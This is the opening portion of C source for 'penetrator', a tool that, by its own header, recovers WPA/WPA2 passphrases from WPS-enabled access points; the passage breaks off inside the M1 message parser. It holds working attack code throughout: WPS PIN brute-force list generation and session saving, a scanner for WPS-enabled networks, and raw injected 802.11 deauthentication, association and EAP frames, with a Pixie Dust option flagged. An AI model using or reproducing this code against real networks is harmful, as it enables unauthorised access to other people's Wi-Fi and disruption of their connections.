/*
    penetrator - retrieve WPA/WPA2 passphrase from a WPS-enabled AP
    Copyright (C) 2015 David Cernak <d.cernak@pobox.sk>
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <pcap.h>
#include <time.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <semaphore.h>
#include <sys/ioctl.h>
#include <openssl/dh.h>
#include <openssl/aes.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>

int VERBOSE;
unsigned TIMEOUT;
int MAXRESEND;
int PIXIEDUST;
int FUCKNACK;
int FUCKSESSIONS;
unsigned long long int MIDDELAY;
int AKTCHANNEL;
char *homedir;
unsigned long long int FAILSLEEP;
int autoatak;
int killgui;

sem_t passes_sem;
typedef struct passes{
  char pin[9];
  char pass[256];
  char ssid[256];
  int passlen;
  struct passes *next;
}pASSES;

pASSES *passlist;

unsigned char dh_g[1] = { 0x02 };
unsigned char dh_p[192] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xC9, 0x0F, 0xDA, 0xA2, 0x21, 0x68, 0xC2, 0x34,
    0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
    0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74,
    0x02, 0x0B, 0xBE, 0xA6, 0x3B, 0x13, 0x9B, 0x22,
    0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
    0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B,
    0x30, 0x2B, 0x0A, 0x6D, 0xF2, 0x5F, 0x14, 0x37,
    0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
    0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6,
    0xF4, 0x4C, 0x42, 0xE9, 0xA6, 0x37, 0xED, 0x6B,
    0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
    0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5,
    0xAE, 0x9F, 0x24, 0x11, 0x7C, 0x4B, 0x1F, 0xE6,
    0x49, 0x28, 0x66, 0x51, 0xEC, 0xE4, 0x5B, 0x3D,
    0xC2, 0x00, 0x7C, 0xB8, 0xA1, 0x63, 0xBF, 0x05,
    0x98, 0xDA, 0x48, 0x36, 0x1C, 0x55, 0xD3, 0x9A,
    0x69, 0x16, 0x3F, 0xA8, 0xFD, 0x24, 0xCF, 0x5F,
    0x83, 0x65, 0x5D, 0x23, 0xDC, 0xA3, 0xAD, 0x96,
    0x1C, 0x62, 0xF3, 0x56, 0x20, 0x85, 0x52, 0xBB,
    0x9E, 0xD5, 0x29, 0x07, 0x70, 0x96, 0x96, 0x6D,
    0x67, 0x0C, 0x35, 0x4E, 0x4A, 0xBC, 0x98, 0x04,
    0xF1, 0x74, 0x6C, 0x08, 0xCA, 0x23, 0x73, 0x27,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};

void *sha256_hmac(char *key,int klen,char *data,int datalen){
  unsigned char *ret=malloc(32);
  unsigned int l=32;
  HMAC_CTX ctx;
  HMAC_CTX_init(&ctx);
  HMAC_Init_ex(&ctx,key,klen,EVP_sha256(),0);
  HMAC_Update(&ctx,(unsigned char*)data,datalen);
  HMAC_Final(&ctx,ret,&l);
  HMAC_CTX_cleanup(&ctx);
  return ret;
}

void *kdf(void *kdk,char *label,int size){
	int slen=strlen(label);
	void *hashme=malloc(8+slen);
	memcpy(hashme+4,label,slen);
	*(int*)(hashme+4+slen)=__builtin_bswap32(size);
	int i,iter=(size+255)/256;
	void *ret=malloc(iter*256);
	void *cur=ret;

	for(i=1;i<=iter;i++){
	  *(int*)(hashme)=__builtin_bswap32(i);
	  char *tmp=sha256_hmac(kdk,32,hashme,8+slen);
	  memcpy(cur,tmp,32);
	  free(tmp);
	  cur+=32;
	}	
	free(hashme);
	return ret;
}

int ComputeChecksum(unsigned long int PIN){//From official wps spec
  unsigned long int accum = 0;
  PIN *= 10;
  accum += 3 * ((PIN / 10000000) % 10);
  accum += 1 * ((PIN / 1000000) % 10);
  accum += 3 * ((PIN / 100000) % 10);
  accum += 1 * ((PIN / 10000) % 10);
  accum += 3 * ((PIN / 1000) % 10);
  accum += 1 * ((PIN / 100) % 10);
  accum += 3 * ((PIN / 10) % 10);
  int digit = (accum % 10);
  return (10 - digit) % 10;
}

//CRC32 is ripped from stackoverflow pls: http://stackoverflow.com/questions/11523844/802-11-fcs-crc32 - thanks
const u_int32_t crctable[] = {
   0x00000000L, 0x77073096L, 0xee0e612cL, 0x990951baL, 0x076dc419L, 0x706af48fL, 0xe963a535L, 0x9e6495a3L,
   0x0edb8832L, 0x79dcb8a4L, 0xe0d5e91eL, 0x97d2d988L, 0x09b64c2bL, 0x7eb17cbdL, 0xe7b82d07L, 0x90bf1d91L,
   0x1db71064L, 0x6ab020f2L, 0xf3b97148L, 0x84be41deL, 0x1adad47dL, 0x6ddde4ebL, 0xf4d4b551L, 0x83d385c7L,
   0x136c9856L, 0x646ba8c0L, 0xfd62f97aL, 0x8a65c9ecL, 0x14015c4fL, 0x63066cd9L, 0xfa0f3d63L, 0x8d080df5L,
   0x3b6e20c8L, 0x4c69105eL, 0xd56041e4L, 0xa2677172L, 0x3c03e4d1L, 0x4b04d447L, 0xd20d85fdL, 0xa50ab56bL,
   0x35b5a8faL, 0x42b2986cL, 0xdbbbc9d6L, 0xacbcf940L, 0x32d86ce3L, 0x45df5c75L, 0xdcd60dcfL, 0xabd13d59L,
   0x26d930acL, 0x51de003aL, 0xc8d75180L, 0xbfd06116L, 0x21b4f4b5L, 0x56b3c423L, 0xcfba9599L, 0xb8bda50fL,
   0x2802b89eL, 0x5f058808L, 0xc60cd9b2L, 0xb10be924L, 0x2f6f7c87L, 0x58684c11L, 0xc1611dabL, 0xb6662d3dL,
   0x76dc4190L, 0x01db7106L, 0x98d220bcL, 0xefd5102aL, 0x71b18589L, 0x06b6b51fL, 0x9fbfe4a5L, 0xe8b8d433L,
   0x7807c9a2L, 0x0f00f934L, 0x9609a88eL, 0xe10e9818L, 0x7f6a0dbbL, 0x086d3d2dL, 0x91646c97L, 0xe6635c01L,
   0x6b6b51f4L, 0x1c6c6162L, 0x856530d8L, 0xf262004eL, 0x6c0695edL, 0x1b01a57bL, 0x8208f4c1L, 0xf50fc457L,
   0x65b0d9c6L, 0x12b7e950L, 0x8bbeb8eaL, 0xfcb9887cL, 0x62dd1ddfL, 0x15da2d49L, 0x8cd37cf3L, 0xfbd44c65L,
   0x4db26158L, 0x3ab551ceL, 0xa3bc0074L, 0xd4bb30e2L, 0x4adfa541L, 0x3dd895d7L, 0xa4d1c46dL, 0xd3d6f4fbL,
   0x4369e96aL, 0x346ed9fcL, 0xad678846L, 0xda60b8d0L, 0x44042d73L, 0x33031de5L, 0xaa0a4c5fL, 0xdd0d7cc9L,
   0x5005713cL, 0x270241aaL, 0xbe0b1010L, 0xc90c2086L, 0x5768b525L, 0x206f85b3L, 0xb966d409L, 0xce61e49fL,
   0x5edef90eL, 0x29d9c998L, 0xb0d09822L, 0xc7d7a8b4L, 0x59b33d17L, 0x2eb40d81L, 0xb7bd5c3bL, 0xc0ba6cadL,
   0xedb88320L, 0x9abfb3b6L, 0x03b6e20cL, 0x74b1d29aL, 0xead54739L, 0x9dd277afL, 0x04db2615L, 0x73dc1683L,
   0xe3630b12L, 0x94643b84L, 0x0d6d6a3eL, 0x7a6a5aa8L, 0xe40ecf0bL, 0x9309ff9dL, 0x0a00ae27L, 0x7d079eb1L,
   0xf00f9344L, 0x8708a3d2L, 0x1e01f268L, 0x6906c2feL, 0xf762575dL, 0x806567cbL, 0x196c3671L, 0x6e6b06e7L,
   0xfed41b76L, 0x89d32be0L, 0x10da7a5aL, 0x67dd4accL, 0xf9b9df6fL, 0x8ebeeff9L, 0x17b7be43L, 0x60b08ed5L,
   0xd6d6a3e8L, 0xa1d1937eL, 0x38d8c2c4L, 0x4fdff252L, 0xd1bb67f1L, 0xa6bc5767L, 0x3fb506ddL, 0x48b2364bL,
   0xd80d2bdaL, 0xaf0a1b4cL, 0x36034af6L, 0x41047a60L, 0xdf60efc3L, 0xa867df55L, 0x316e8eefL, 0x4669be79L,
   0xcb61b38cL, 0xbc66831aL, 0x256fd2a0L, 0x5268e236L, 0xcc0c7795L, 0xbb0b4703L, 0x220216b9L, 0x5505262fL,
   0xc5ba3bbeL, 0xb2bd0b28L, 0x2bb45a92L, 0x5cb36a04L, 0xc2d7ffa7L, 0xb5d0cf31L, 0x2cd99e8bL, 0x5bdeae1dL,
   0x9b64c2b0L, 0xec63f226L, 0x756aa39cL, 0x026d930aL, 0x9c0906a9L, 0xeb0e363fL, 0x72076785L, 0x05005713L,
   0x95bf4a82L, 0xe2b87a14L, 0x7bb12baeL, 0x0cb61b38L, 0x92d28e9bL, 0xe5d5be0dL, 0x7cdcefb7L, 0x0bdbdf21L,
   0x86d3d2d4L, 0xf1d4e242L, 0x68ddb3f8L, 0x1fda836eL, 0x81be16cdL, 0xf6b9265bL, 0x6fb077e1L, 0x18b74777L,
   0x88085ae6L, 0xff0f6a70L, 0x66063bcaL, 0x11010b5cL, 0x8f659effL, 0xf862ae69L, 0x616bffd3L, 0x166ccf45L,
   0xa00ae278L, 0xd70dd2eeL, 0x4e048354L, 0x3903b3c2L, 0xa7672661L, 0xd06016f7L, 0x4969474dL, 0x3e6e77dbL,
   0xaed16a4aL, 0xd9d65adcL, 0x40df0b66L, 0x37d83bf0L, 0xa9bcae53L, 0xdebb9ec5L, 0x47b2cf7fL, 0x30b5ffe9L,
   0xbdbdf21cL, 0xcabac28aL, 0x53b39330L, 0x24b4a3a6L, 0xbad03605L, 0xcdd70693L, 0x54de5729L, 0x23d967bfL,
   0xb3667a2eL, 0xc4614ab8L, 0x5d681b02L, 0x2a6f2b94L, 0xb40bbe37L, 0xc30c8ea1L, 0x5a05df1bL, 0x2d02ef8dL
};

u_int32_t crc32(u_int32_t bytes_sz, const u_int8_t *bytes)
{
   u_int32_t crc = ~0;
   u_int32_t i;
   for(i = 0; i < bytes_sz; ++i) {
      crc = crctable[(crc ^ bytes[i]) & 0xff] ^ (crc >> 8);
   }
   return ~crc;
}


unsigned long long int ffmac;

typedef struct scanlist{
  int id;
  char pwr;
  int channel;
  char *ssid;
  int wps;
  int lock;
  unsigned long long int bssid;
  struct scanlist *next;
}SCANLIST;

int threads;

typedef struct pinlist{
  int psk;
  struct pinlist *next;
}PINLIST;

typedef struct pins{
  int mode; //0-PSK1 1-PSK2
  int psk1; //use this if mode 1
  int psk2; //use this if mode 0
  PINLIST *unused1,*used1;
  PINLIST *unused2,*used2;
  sem_t mutex;
}PINS;

void key_init(PINS *keys){
  sem_init(&(keys->mutex),0,1);
  keys->psk1=0;
  keys->psk2=0;
  keys->mode=0;
  keys->unused1=NULL;
  keys->unused2=NULL;
  keys->used1=NULL;
  keys->used2=NULL;
}

void key_mode(PINS *keys,int psk){
  sem_wait(&(keys->mutex));
  keys->psk1=psk;
  keys->mode=1;
  sem_post(&(keys->mutex));
}

void key_gen(PINS *keys){
  int i;
  PINLIST *last=NULL;
  for(i=0;i<10000;i++){
    if(!last){
      keys->unused1=malloc(sizeof(PINLIST));
      keys->unused1->psk=i;
      keys->unused1->next=NULL;
      last=keys->unused1;
    }else{
      PINLIST *add=malloc(sizeof(PINLIST));
      add->psk=i;
      add->next=NULL;
      last->next=add;
      last=add;
    }
  }
  last=NULL;
  for(i=0;i<1000;i++){
    if(!last){
      keys->unused2=malloc(sizeof(PINLIST));
      keys->unused2->psk=i;
      keys->unused2->next=NULL;
      last=keys->unused2;
    }else{
      PINLIST *add=malloc(sizeof(PINLIST));
      add->psk=i;
      add->next=NULL;
      last->next=add;
      last=add;
    }
  }
}

void key_load(char *fn,PINS *keys){
  if(FUCKSESSIONS){key_gen(keys);return;}
  FILE *f=fopen(fn,"r");
  if(!f){/*printf("[PENETRATOR] Unable to open file\n");*/return;}
  sem_wait(&(keys->mutex));
  PINLIST *last1=NULL,*last2=NULL;
  while(1){
    int psk,part;
    if(fscanf(f,"%d:%d\n",&part,&psk)<2)break;
    PINLIST *add=malloc(sizeof(PINLIST));
    add->next=NULL;
    add->psk=psk;
    if(part==1){
      if(last1)last1->next=add;
      else keys->unused1=add;
      last1=add;
    }else if(part==2){
      if(last2)last2->next=add;
      else keys->unused2=add;
      last2=add;
    }else {keys->psk1=psk;keys->mode=1;}
  }
  
  sem_post(&(keys->mutex));
  fclose(f);
}

void key_save(char *fn,PINS *keys){
  FILE *f=fopen(fn,"w");
  if(!f){printf("[PENETRATOR] Unable to open file\n");return;}
  sem_wait(&(keys->mutex));
  PINLIST *akt;
  if(keys->mode)fprintf(f,"3:%d\n",keys->psk1);
  akt=keys->used1;
  while(akt){
    fprintf(f,"1:%d\n",akt->psk);
    akt=akt->next;
  }
  akt=keys->unused1;
  while(akt){
    fprintf(f,"1:%d\n",akt->psk);
    akt=akt->next;
  }
  akt=keys->used2;
  while(akt){
    fprintf(f,"2:%d\n",akt->psk);
    akt=akt->next;
  }
  akt=keys->unused2;
  while(akt){
    fprintf(f,"2:%d\n",akt->psk);
    akt=akt->next;
  }
  sem_post(&(keys->mutex));
  fclose(f);
}

void key_remove(PINS *keys,int psk,int mode){
  sem_wait(&(keys->mutex));
  if(!mode){
    PINLIST *akt=keys->used1;
    PINLIST *last=NULL;
    while(akt){
      if(akt->psk==psk){
        if(last)last->next=akt->next;
        else keys->used1=akt->next;
        break;
      }
      last=akt;
      akt=akt->next;
    }
    free(akt);
    sem_post(&(keys->mutex));
    return;
  }
  PINLIST *akt=keys->used2;
  PINLIST *last=NULL;
  while(akt){
    if(akt->psk==psk){
      if(last)last->next=akt->next;
      else keys->used2=akt->next;
      break;
    }
    last=akt;
    akt=akt->next;
  }
  free(akt);
  sem_post(&(keys->mutex));
  return;
}

int key_get(PINS *keys,int *out){
  sem_wait(&(keys->mutex));
  if(!keys->mode){
    if(!keys->unused1&&!keys->used1)return 3;
    if(!keys->unused1)return 2;
    PINLIST *my=keys->unused1;
    keys->unused1=my->next;
    my->next=keys->used1;
    keys->used1=my;
    *out=my->psk;
    sem_post(&(keys->mutex));
    return 0;
  }
  if(!keys->unused2&&!keys->used2)return 3;
  if(!keys->unused2)return 2;
  PINLIST *my=keys->unused2;
  keys->unused2=my->next;
  my->next=keys->used2;
  keys->used2=my;
  *out=my->psk;
  sem_post(&(keys->mutex));
  return 1;
}

void key_return(PINS *keys,int psk,int mode){
  sem_wait(&(keys->mutex));
  
  if(!mode){
    PINLIST *akt=keys->used1;
    PINLIST *last=NULL;
    while(akt){
      if(akt->psk==psk){
        if(last)last->next=akt->next;
        else keys->used1=akt->next;
        break;
      }
      last=akt;
      akt=akt->next;
    }
    akt->next=keys->unused1;
    keys->unused1=akt;
    sem_post(&(keys->mutex));
    return;
  }
  PINLIST *akt=keys->used2;
  PINLIST *last=NULL;
  while(akt){
    if(akt->psk==psk){
      if(last)last->next=akt->next;
      else keys->used2=akt->next;
      break;
    }
    last=akt;
    akt=akt->next;
  }
  akt->next=keys->unused2;
  keys->unused2=akt;
  sem_post(&(keys->mutex));
  return;
}

typedef struct attack_info{
  int ded;
  int thread_id;//thread id - used when removing thread from memory
  char iv[16];//iv for aes
  int lastpsk;//last part of pin retrieved by key_get
  int lastmode;
  PINS *pins;//retrieve pins from here
  char pin[9];
  unsigned long long int src_mac;
  unsigned long long int tgt_mac;
  char *ssid;
  int wps;
  int wpslock;
  unsigned char *packet;//fresh packet
  int len;//packet len
  int radiotap_len;//len of radiotap header
  int sn;//sequence number
  struct attack_info *next;//linked list
  sem_t mutex;//thread waits here for packets
  sem_t ready;//signals here when reading finished
  unsigned long long int lastsend;//last packet transmission
  unsigned char eap_id;//eap id from last received msg
  char secret[2048];
  char rh1[32],rh2[32];
  char pke[2048];
  char pkr[2048];
  char ehash1[2048];
  char ehash2[2048];
  char enonce[2048];
  char rnonce[2048];
  int printedshit;
  char derived[2048];//derived key (kdf) - authkey+keywrapkey+some other shit
  int pixiewin;
  char rs1[2048];
  char rs2[2048];

  char ruuid[2048];

  void *m1,*m3,*m5;//last messages for authenticator
  int m1l,m3l,m5l;//tehir len

  char sent[6];
  char got[7];
  int gotm5;

  void *resendmsg;
  int resendlen;
  int resended;

  int wins;
  int inarow;
  unsigned long long int waittil,lastsuc;
  int active;

  char foundpass[256];
  char foundpin[9];

  int pixiefail;

  unsigned long long int timelimit;
}ATTACK_INFO;

int hex2raw(char *hex,void *out){int i;for(i=0;hex[i];i+=3){sscanf((char*)hex+i,"%02hhx",(unsigned char*)out+(i/3));if(hex[i+2]==0)break;}return (i+3)/3;}
int hexlen(char *hex){int i,len=0;for(i=0;hex[i];i++)if(hex[i]==' ')len++;return len+1;}
void printhex(void *hex,int len){int i;for(i=0;i<len;i++){if(i)putchar(':');printf("%02hhx",((unsigned char*)hex)[i]);}putchar('\n');}
void raw2hex(void *hex,char *out,int len){*out=0;int i;for(i=0;i<len;i++){if(i)strcat(out,":");char cat[32];sprintf(cat,"%02hhx",((unsigned char*)hex)[i]);strcat(out,cat);}}

unsigned long long int get_data(unsigned char *mac,int len,int reverse){
  unsigned long long int data=0;
  int i;
  if(reverse)for(i=0;i<len;i++)((char*)&data)[len-i-1]=mac[i];
  else for(i=0;i<len;i++)((char*)&data)[i]=mac[i];
  return data;
}

unsigned long long int hex2int(char *hex,int reverse){
  char out[8];
  int l=hex2raw(hex,out);
  unsigned long long int ret=get_data((unsigned char*)out,l,reverse);
  return ret;
}

u_int64_t gettick() { //this is somewhere from stackoveflow too, thanks
    struct timespec ts;
    unsigned theTick = 0U;
    clock_gettime( CLOCK_REALTIME, &ts );
    theTick  = ts.tv_nsec / 1000000;
    theTick += ts.tv_sec * 1000;
    return theTick;
}

void parsebeacon(unsigned char *pkt,int len,char **ssid,int *wps,int *wpslock,int *channel){
  *wps=0;
  *wpslock=0;
  while(1){
    if(len<2)return;
    int tagnumber=pkt[0];
    int taglen=pkt[1];
    if(tagnumber==0&&ssid&&!(*ssid)){
      if(taglen==0){(*ssid)=calloc(1,5);strcpy(*ssid,"NULL");}
      else{
        (*ssid)=calloc(1,taglen+1);
        memcpy(*ssid,pkt+2,taglen);
      }
    }else if(tagnumber==3&&channel)*channel=pkt[2];
    else if(tagnumber==221&&wps){
      unsigned char *tmp=pkt+6;
      int tmplen=taglen-4;
      int oui=get_data(pkt+2,4,0);
      if(oui==0x04F25000)while(1){
	if(tmplen<4)break;
        int type=get_data(tmp,2,1);
        int wlen=get_data(tmp+2,2,1);
	if(type==4170)*wps=tmp[4];
	if(type==4183&&wpslock)*wpslock=tmp[4];
	tmp+=4+wlen;
	tmplen-=(4+wlen);
      }
    }
    pkt+=(taglen+2);
    len-=(taglen+2);
  }
}

ATTACK_INFO *attack_list;
sem_t mutex;
int found;

void scanshit(const unsigned char *packet, struct pcap_pkthdr head,SCANLIST **list){
  unsigned char *gotpkt=(unsigned char*)packet;
  int len=head.len;
  if(len<4)return;
  int flags=gotpkt[4]&2;
  int fcs=0;
  if(flags){
    if(len<16)return;
    fcs=gotpkt[16]&16;
  }
  unsigned radiotap_len=gotpkt[2]+(gotpkt[3]<<8);
  if(fcs){
    int fcs=get_data(gotpkt+(len-4),4,0);
    int hash=crc32(len-(radiotap_len+4),gotpkt+radiotap_len);
    if(fcs!=hash){if(VERBOSE>0)printf("[PENETRATOR] Received packet with wrong FCS\n");return;}
  }
  unsigned char *pkt=gotpkt+radiotap_len;
  len-=radiotap_len;
  if(len<15)return;
  unsigned long long int src=get_data(pkt+10,6,0);
  if(pkt[0]==128){
    pkt+=36;
    len-=36;
    char *ssid=NULL;
    int wps,wpsl,chnl;
    parsebeacon(pkt,len,&ssid,&wps,&wpsl,&chnl);
    if(!wps&&ssid){free(ssid);return;}
    SCANLIST *akt=*list;
    int exists=0;
    while(akt){
      if(akt->bssid==src){exists=1;break;}
      akt=akt->next;
    }
    if(!exists){
      SCANLIST *add=malloc(sizeof(SCANLIST));
      add->bssid=src;
      add->ssid=ssid;
      add->channel=chnl;
      add->wps=wps;
      add->lock=wpsl;
      add->pwr=packet[22];
      add->next=*list;
      add->id=found++;
      *list=add;
      char *mac=(char*)&src;
      char lok[4];
      if(wpsl)strcpy(lok,"yes");
      else strcpy(lok,"no");
      printf("%02d %hhd %02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX\t%d\t%d.%d\t%s\t%s\n",add->id,add->pwr,mac[0],mac[1],mac[2],mac[3],mac[4],mac[5],chnl,wps>>4,wps&15,lok,ssid);
    }
  }
}


void parsepacket(const unsigned char *packet, struct pcap_pkthdr head){
  unsigned char *gotpkt=(unsigned char*)packet;
  int len=head.len;
  if(len<4)return;
  int flags=gotpkt[4]&2;
  int fcs=0;
  if(flags){
    if(len<16)return;
    fcs=gotpkt[16]&16;
  }
  unsigned radiotap_len=gotpkt[2]+(gotpkt[3]<<8);
  if(fcs){
    int fcs=get_data(gotpkt+(len-4),4,0);
    int hash=crc32(len-(radiotap_len+4),gotpkt+radiotap_len);
    if(fcs!=hash){if(VERBOSE>0)printf("[PENETRATOR] Received packet with wrong FCS\n");return;}
  }
  unsigned char *pkt=gotpkt+radiotap_len;
  len-=radiotap_len;
  if(len<15)return;
  unsigned long long int dest=get_data(pkt+4,6,1);
  unsigned long long int src=get_data(pkt+10,6,1);
  
  sem_wait(&mutex);
  ATTACK_INFO *attack=attack_list;
  while(attack){
    if(attack->active&&attack->tgt_mac==src&&(attack->src_mac==dest||dest==ffmac)){
      attack->packet=malloc(head.len);
      attack->len=head.len;
      attack->radiotap_len=radiotap_len;
      memcpy(attack->packet,gotpkt,attack->len);
      sem_post(&(attack->mutex));
      sem_wait(&(attack->ready));
    }
  attack=attack->next;
  }
  sem_post(&mutex);
}

pcap_t *fp;
sem_t sendmutex;

void int2hex(unsigned long long int macint,char *out){
  unsigned char *mac=(unsigned char*)&macint;
  sprintf(out,"%02hhX %02hhX %02hhX %02hhX %02hhX %02hhX",mac[5],mac[4],mac[3],mac[2],mac[1],mac[0]);
}

void sn2hex(int sn,char *out){
  unsigned short snint=sn<<4;
  sprintf(out,"%02hhX %02hhX",((unsigned char*)&snint)[0],((unsigned char*)&snint)[1]);
}

int deauth(ATTACK_INFO *attack){
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];

  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 c0 00 34 00 %s %s %s %s 03 00",tgt,src,tgt,sn);
  char raw[2048];
  int len=hex2raw(packet,raw);
  
  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);

  if(attack->resendmsg)free(attack->resendmsg);
  attack->resendmsg=malloc(len);
  memcpy(attack->resendmsg,raw,len);
  attack->resendlen=len;

  if(VERBOSE>0)printf("[PENETRATOR] Sending deauth\n");
  return 0;
}

int auth(ATTACK_INFO *attack){
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];

  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 b0 00 34 00 %s %s %s %s 00 00 01 00 00 00",tgt,src,tgt,sn);
  char raw[2048];
  int len=hex2raw(packet,raw);
  
  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);

  if(attack->resendmsg)free(attack->resendmsg);
  attack->resendmsg=malloc(len);
  memcpy(attack->resendmsg,raw,len);
  attack->resendlen=len;

  if(VERBOSE>0)printf("[PENETRATOR] Sending auth request\n");
  return 0;
}

int parse_auth_response(ATTACK_INFO *attack){
  unsigned char *pkt=attack->packet+attack->radiotap_len;
  int len=attack->len-attack->radiotap_len;
  if(len<29||pkt[0]!=176)return 1;
  int seq=get_data(pkt+26,2,0);
  int cod=get_data(pkt+28,2,0);
  if(seq==2&&cod==0)return 0;
  return 1;
}

int assoc(ATTACK_INFO *attack){
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];
  char ssid[512];
  memset(ssid,0,512);
  int slen=strlen(attack->ssid);
  if(slen>255){printf("[PENETRATOR] SSID is fucked up hard m8\n");return 1;}
  raw2hex(attack->ssid,ssid,slen);
  unsigned char ssid_len=slen;
  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 00 00 3a 01 %s %s %s %s 31 04 64 00 00 %02hhX %s \
01 08 82 84 8b 96 0c 12 18 24 32 04 30 48 60 6c dd 0e 00 50 f2 04 10 4a 00 01 10 10 3a 00 01 02",tgt,src,tgt,sn,ssid_len,ssid);
  char raw[2048];
  int len=hex2raw(packet,raw);
  
  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);

  if(attack->resendmsg)free(attack->resendmsg);
  attack->resendmsg=malloc(len);
  memcpy(attack->resendmsg,raw,len);
  attack->resendlen=len;

  if(VERBOSE>0)printf("[PENETRATOR] Sending association request\n");
  return 0;
}

int parse_assoc_response(ATTACK_INFO *attack){
  unsigned char *pkt=attack->packet+attack->radiotap_len;
  int len=attack->len-attack->radiotap_len;
  if(len<29||pkt[0]!=16)return 1;
  int suc=get_data(pkt+26,2,0);
  if(!suc)return 0;
  return 1;
}

int eapol_start(ATTACK_INFO *attack){
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];

  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 08 01 3a 01 %s %s %s %s aa aa 03 00 00 00 88 8e 01 01 00 00",tgt,src,tgt,sn);
  char raw[2048];
  int len=hex2raw(packet,raw);
  
  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);

  if(attack->resendmsg)free(attack->resendmsg);
  attack->resendmsg=malloc(len);
  memcpy(attack->resendmsg,raw,len);
  attack->resendlen=len;
  attack->resendlen=len;

  if(VERBOSE>0)printf("[PENETRATOR] Sending EAPOL start\n");
  return 0;
}

int parse_identity_rq(ATTACK_INFO *attack){
  unsigned char *pkt=attack->packet+attack->radiotap_len;
  int len=attack->len-attack->radiotap_len;
  if(len<40||pkt[0]!=8)return 1;
  int llcorg=get_data(pkt+27,3,0);
  int llctyp=get_data(pkt+30,2,0);
  if(llcorg!=0||llctyp!=36488||pkt[33]||pkt[36]!=1||pkt[40]!=1)return 1;
  attack->eap_id=pkt[37];
  return 0;
}

int eap_terminate(ATTACK_INFO *attack,unsigned char eap_id){
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];

  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 08 01 34 00 %s %s %s %s \
aa aa 03 00 00 00 88 8e 01 00 00 05 04 %02hhX 00 05 04",tgt,src,tgt,sn,eap_id);
  char raw[2048];
  int len=hex2raw(packet,raw);
  
  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);

  if(attack->resendmsg)free(attack->resendmsg);
  attack->resendmsg=malloc(len);
  memcpy(attack->resendmsg,raw,len);
  attack->resendlen=len;

  if(VERBOSE>0)printf("[PENETRATOR] Sending EAP terminate\n");
  return 0;
}

int identity_response(ATTACK_INFO *attack){
  char packet[2048];
  char tgt[32];
  char src[32];
  char sn[8];

  sn2hex((attack->sn)++,sn);
  int2hex(attack->tgt_mac,tgt);
  int2hex(attack->src_mac,src);
  sprintf(packet,"00 00 08 00 00 00 00 00 08 01 3a 01 %s %s %s %s aa aa 03 00 00 00 88 8e \
01 00 00 23 02 %02hhx 00 23 01 57 46 41 2d 53 69 6d 70 6c 65 43 6f 6e 66 69 67 2d \
52 65 67 69 73 74 72 61 72 2d 31 2d 30",tgt,src,tgt,sn,attack->eap_id);
  char raw[2048];
  int len=hex2raw(packet,raw);
  
  sem_wait(&sendmutex);
  pcap_inject(fp,raw,len);
  attack->lastsend=gettick();
  sem_post(&sendmutex);

  if(attack->resendmsg)free(attack->resendmsg);
  attack->resendmsg=malloc(len);
  memcpy(attack->resendmsg,raw,len);
  attack->resendlen=len;

  if(VERBOSE>0)printf("[PENETRATOR] Sending identity response\n");
  return 0;
}

int parse_m1(ATTACK_INFO *attack){
  unsigned char *pkt=attack->packet+attack->radiotap_len;
  int len=attack->len-attack->radiotap_len;
  if(len<40||pkt[0]!=8)return 1;
  int llcorg=get_data(pkt+27,3,0);
  int llctyp=get_data(pkt+30,2,0);
  if(llcorg!=0||llctyp!=36488||pkt[33]||pkt[36]!=1||pkt[40]!=254)return 1;
  int msglen=get_data(pkt+38,2,1)-14;
  unsigned char *akt=pkt+50;
  char enonce[2048];
